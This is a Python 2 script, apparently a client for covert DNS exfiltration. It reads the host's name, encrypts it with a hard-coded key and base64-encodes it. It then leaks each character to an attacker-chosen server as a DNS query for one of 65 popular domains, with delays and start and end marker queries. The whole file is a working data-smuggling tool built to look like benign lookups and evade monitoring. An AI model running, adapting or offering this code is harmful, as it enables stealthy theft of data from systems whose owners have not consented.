import socket
import sys
import nacl.secret
import nacl.utils
import base64
import time
import struct

def lol(url,val):

	dots = []
	c = 0
	g = len(url)
	for x in url:
		if x is ".":
			dots.append(c)
		c = c + 1

	dot1 = dots[0]
	dot2 = dots[1] - 4
	dot3 = 3

	b = chr(dot1)
	f = 0
	for x in url:
		if x is ".":
			if f == 1:
				b = b + chr(dot3)
			if f == 0:
				b = b + chr(dot2)
				f = 1
		else:
			b = b + x

	#yyyy = ":".join("{:02x}".format(ord(c)) for c in b)
	#print yyyy
	
	crc = struct.unpack('4B', struct.pack('>I', val))
	packet = chr(crc[2]) + chr(crc[3]) + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b + "\x00\x00\x01\x00\x01"
	ff = ":".join("{:02x}".format(ord(c)) for c in packet)
	print ff

	client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	client_socket.connect((str(sys.argv[1]), 53))
	client_socket.sendall(packet)
	client_socket.close()

def once():

	key = "\xab\xd2\xe5\x86\x84\xdb\xfb\xf7\x9c\x37\x1a\xab\x20\x9a\x3e\x1d\x5a\xf8\xcd\xf3\x74\xc0\x4b\x17\x9a\x2d\x8b\xdc\x20\x5a\x4d\xd1" 
	box = nacl.secret.SecretBox(key)
	val = str(socket.gethostname())
	nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
	encrypted = box.encrypt(val, nonce)
	print encrypted
	what2 = base64.b64encode(bytes(encrypted))
	val = crc(val)
	
	lol("www.first.com",val)
	
	print "DATA: " + what2

	base = []
	
	base.append("www.lycos.com")
	base.append("www.aa.com")
	base.append("www.reddit.com")
	base.append("www.ibm.com")
	base.append("www.microsoft.com")
	base.append("www.virgin.net")
	base.append("www.adobe.com")
	base.append("www.citrix.com")
	base.append("www.honda.com")
	base.append("www.bing.com")
	base.append("www.qantas.com")
	base.append("www.asus.com")
	base.append("www.yahoo.com")
	base.append("www.zdnet.com")
	base.append("www.cnet.com")
	base.append("www.wired.com")
	base.append("www.twitter.com")
	base.append("www.cnn.com")
	base.append("www.foxnews.com")
	base.append("www.wikipedia.org")
	base.append("www.snapchat.com")
	base.append("www.skype.com")
	base.append("www.pinterest.com")
	base.append("www.burgerking.com")
	base.append("www.nike.com")
	base.append("www.valvesoftware.com")
	base.append("www.apple.com")
	base.append("www.shopify.com")
	base.append("www.spotify.com")
	base.append("www.amazon.com")
	base.append("www.philips.com")
	base.append("www.youtube.com")
	base.append("www.dominos.com")
	base.append("www.linkedin.com")
	base.append("www.glassdoor.com")
	base.append("www.ebay.com")
	base.append("www.craigslist.org")
	base.append("www.msn.com")
	base.append("www.subway.com")
	base.append("www.bbc.com")
	base.append("www.netflix.com")
	base.append("www.primevideo.com")
	base.append("www.time.com")
	base.append("www.nissan.com")
	base.append("www.nasa.gov")
	base.append("www.godaddy.com")
	base.append("www.adidas.com")
	base.append("www.skyscanner.com")
	base.append("www.tripadvisor.com")
	base.append("www.macys.com")
	base.append("www.mcdonalds.com")
	base.append("www.nvidia.com")
	base.append("www.amd.com")
	base.append("www.intel.com")
	base.append("www.logitech.com")
	base.append("www.ford.com")
	base.append("www.dell.com")
	base.append("www.hp.com")
	base.append("www.htc.com")
	base.append("www.sonos.com")
	base.append("www.panasonic.com")
	base.append("www.jvc.com")
	base.append("www.patagonia.com")
	base.append("www.sans.com")
	base.append("www.birkenstock.com")

	for x in what2:
		time.sleep(5)
		if x is "A":
			lol(base[0],val)
		if x is "B":
			lol(base[1],val)
		if x is "C":
			lol(base[2],val)
		if x is "D":
			lol(base[3],val)
		if x is "E":
			lol(base[4],val)
		if x is "F":
			lol(base[5],val)
		if x is "G":
			lol(base[6],val)
		if x is "H":
			lol(base[7],val)
		if x is "I":
			lol(base[8],val)
		if x is "J":
			lol(base[9],val)
		if x is "K":
			lol(base[10],val)
		if x is "L":
			lol(base[11],val)
		if x is "M":
			lol(base[12],val)
		if x is "N":
			lol(base[13],val)
		if x is "O":
			lol(base[14],val)
		if x is "P":
			lol(base[15],val)
		if x is "Q":
			lol(base[16],val)
		if x is "R":
			lol(base[17],val)
		if x is "S":
			lol(base[18],val)
		if x is "T":
			lol(base[19],val)
		if x is "U":
			lol(base[20],val)
		if x is "V":
			lol(base[21],val)
		if x is "W":
			lol(base[22],val)
		if x is "X":
			lol(base[23],val)
		if x is "Y":
			lol(base[24],val)
		if x is "Z":
			lol(base[25],val)
		if x is "a":
			lol(base[26],val)
		if x is "b":
			lol(base[27],val)
		if x is "c":
			lol(base[28],val)
		if x is "d":
			lol(base[29],val)
		if x is "e":
			lol(base[30],val)
		if x is "f":
			lol(base[31],val)
		if x is "g":
			lol(base[32],val)
		if x is "h":
			lol(base[33],val)
		if x is "i":
			lol(base[34],val)
		if x is "j":
			lol(base[35],val)
		if x is "k":
			lol(base[36],val)
		if x is "l":
			lol(base[37],val)
		if x is "m":
			lol(base[38],val)
		if x is "n":
			lol(base[39],val)
		if x is "o":
			lol(base[40],val)
		if x is "p":
			lol(base[41],val)
		if x is "q":
			lol(base[42],val)
		if x is "r":
			lol(base[43],val)
		if x is "s":
			lol(base[44],val)
		if x is "t":
			lol(base[45],val)
		if x is "u":
			lol(base[46],val)
		if x is "v":
			lol(base[47],val)
		if x is "w":
			lol(base[48],val)
		if x is "x":
			lol(base[49],val)
		if x is "y":
			lol(base[50],val)
		if x is "z":
			lol(base[51],val)
		if x is "0":
			lol(base[52],val)
		if x is "1":
			lol(base[53],val)
		if x is "2":
			lol(base[54],val)
		if x is "3":
			lol(base[55],val)
		if x is "4":
			lol(base[56],val)
		if x is "5":
			lol(base[57],val)
		if x is "6":
			lol(base[58],val)
		if x is "7":
			lol(base[59],val)
		if x is "8":
			lol(base[60],val)
		if x is "9":
			lol(base[61],val)
		if x is "+":
			lol(base[62],val)
		if x is "/":
			lol(base[63],val)
		if x is "=":
			lol(base[64],val)
	time.sleep(5)
	lol("www.last.com",val)
			
def crc(val):
	crc = 0xFFFF
	bits=8
	for l in val:
		crc ^= ord(l)
		for bit in range(0, bits):
			if crc & 1:
				crc = (crc >> 1) ^ 0xA001
			else:
				crc >>= 1
	return crc
	
	
if __name__ == "__main__":
	if len(sys.argv) != 2:
		print "Please privde server name: python client.py 192.168.0.2"
		sys.exit(1)
	once()
    
